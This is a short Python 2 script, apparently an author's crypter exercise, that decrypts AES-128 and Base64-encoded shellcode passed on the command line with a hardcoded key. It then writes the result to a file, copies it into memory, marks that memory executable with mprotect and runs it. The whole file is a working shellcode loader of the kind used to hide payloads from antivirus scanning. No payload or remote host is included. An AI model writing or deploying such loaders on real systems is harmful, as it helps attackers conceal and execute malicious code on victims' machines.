#!/usr/bin/python

# Author :  Ian McLachlan
# Python Decrypt and Execute with AES 128 & Base64


from Crypto.Cipher import AES
from ctypes import *
import sys, os, base64

def decryptor(ourshellcode):
 seperation ='{'
 decode = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(seperation)
 key = 'aabbccddeeffgghh'
 print 'The encryption key was: ', key
 cipher = AES.new(key)
 decoded = decode (cipher, ourshellcode)
 f = open('shellcode.decrypt','w')
 f.write(decoded)
 f.close()
 print'\r\n'
 print decoded
 libc = CDLL('libc.so.6')
 shellc = decoded.replace('\\x','').decode('hex')
 print (shellc)
 sc = c_char_p(shellc)
 size = len(shellc)
 addr = c_void_p(libc.valloc(size))
 memmove(addr, sc, size)
 libc.mprotect(addr, size, 0x7)
 run = cast(addr, CFUNCTYPE(c_void_p))
 
 run()
 sys.exit(0)

if len(sys.argv) != 2:
 print('**  Usage: '+sys.argv[0]+' shellcode\n\n')
 sys.exit(1)

shellcode = sys.argv[1]
decryptor (shellcode)





